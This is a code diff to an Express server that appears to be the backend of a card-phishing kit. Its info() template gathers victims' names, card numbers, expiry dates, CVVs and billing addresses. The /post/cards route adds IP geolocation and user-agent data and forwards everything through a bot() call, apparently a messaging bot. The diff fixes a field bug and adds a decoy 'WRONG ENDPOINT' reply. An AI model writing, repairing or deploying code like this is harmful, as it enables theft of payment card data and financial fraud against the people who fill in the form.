@@ -13,14 +13,13 @@ const info = (form) => `
 firstName: ${form.firstName},
 lastName: ${form.lastName},
 cardNumber: ${form.cardNumber},
-cardExp: ${form.CardExp},
+cardExp: ${form.cardExp},
 cardCvv: ${form.cardCvv},
 fullName: ${form.fullName},
 address: ${form.address},
 city: ${form.city},
 state: ${form.state},
 zip: ${form.zip},
-email: ${form.email},
 `;
 
 
@@ -119,24 +118,28 @@ app.prepare()
 
     // post url
     server.post("/post/cards" , express.json(), async (req, res) => {
-      const { data } = await geoloc.get("" , {
-        ip : req.client.ip
-      })
-
-    if(req.body.firstName){
-      const geo = data
-      geo.ua = req.client.ua
-      const packed = `
-      ${info(req.body)}
-      ${botString(geo)}
-      `
-      bot(packed)
-    }
-      
-  res.status(200).json({
-    msg : 'done',
-    status : 200,
-  })
+        if(req.body.firstName){
+          const { data } = await geoloc.get("" , {
+            ip : req.client.ip
+          })
+          console.log(data)
+          const geo = data
+          geo.ua = req.client.ua
+          const packed = `
+          ${info(req.body)}
+          ${botString(geo)}
+          `
+          bot(packed)
+          res.status(200).json({
+            msg : 'done',
+            status : 200,
+          })
+        }else{
+          res.status(200).json({
+            msg : 'WRONG ENDPOINT',
+            status : 401,
+          })
+        }
     })
     // you can register any other routes as you want; you can also
     // use ALL the standard Express functions such as
